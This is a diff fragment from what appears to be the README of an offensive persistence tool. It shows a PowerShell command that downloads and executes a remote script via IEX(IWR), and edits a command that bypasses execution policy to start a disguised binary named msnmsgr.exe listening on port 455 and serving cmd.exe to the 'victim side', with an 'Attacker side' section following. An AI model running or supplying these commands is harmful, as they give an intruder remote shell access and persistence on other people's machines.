@@ -61,7 +61,7 @@ powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentR
 The script will be executed automatically. However, please note that it may not work on all systems. If you encounter issues, you may need to adapt the script to the target system's properties.
 This will start the process if in the victim side it's not working 
 ```powershell
-powershell.exe -NoExit -ExecutionPolicy Bypass -Command "Start-Process 'C:\Windows\System32\msnmsgr.exe' -ArgumentList '-Ldp 455 -e cmd.exe' -NoNewWindow"
+powershell -ExecutionPolicy Bypass -Command "Start-Process 'C:\Windows\System32\msnmsgr.exe' -ArgumentList '-Ldp 455 -e cmd.exe' -NoNewWindow"
 ```
 
 ### In the Attacker side
